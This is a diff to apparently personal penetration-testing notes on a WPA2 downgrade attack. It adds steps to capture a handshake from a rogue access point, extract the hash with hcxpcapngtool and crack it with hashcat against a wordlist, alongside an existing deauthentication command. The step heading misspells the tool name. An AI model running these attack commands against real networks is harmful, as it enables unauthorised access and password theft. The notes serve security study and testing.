@@ -45,10 +45,19 @@ sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0
 #### 6. Capture the WPA2 handshake
 Use `airodump-ng` to capture the WPA2 handshake (from when the client tries to connect to our rogue AP):
 ```bash
-sudo airodump-ng -c 6 --bssid <FakeAP_MAC> -w capture wlan0
+sudo airodump-ng -c 6 --bssid <FakeAP_MAC> -w captures/downgrade wlan0
 ```
 You could also do a [noAP](../PSK-attacks/noAP.md) attack using `hostapd-mana` instead.
-#### 7. Connect to the network
+#### 7. Extract the handshake using `hcxpxapngtool` & crack
+Extract the hash from the capture file:
+```bash
+hcxpcapngtool captures/downgrade-01.cap -o downgrade.hash
+```
+Crack with [hashcat](../../cybersecurity/TTPs/cracking/tools/hashcat.md):
+```bash
+hashcat -a 0 -m 22000 downgrade.hash ~/rockyou-top100000.txt --force
+```
+#### 8. Connect to the network
 Once you have the password, you can connect using `wpa_supplicant` with a conf file (`downgrade.conf`) that looks like this:
 ```bash
 network={
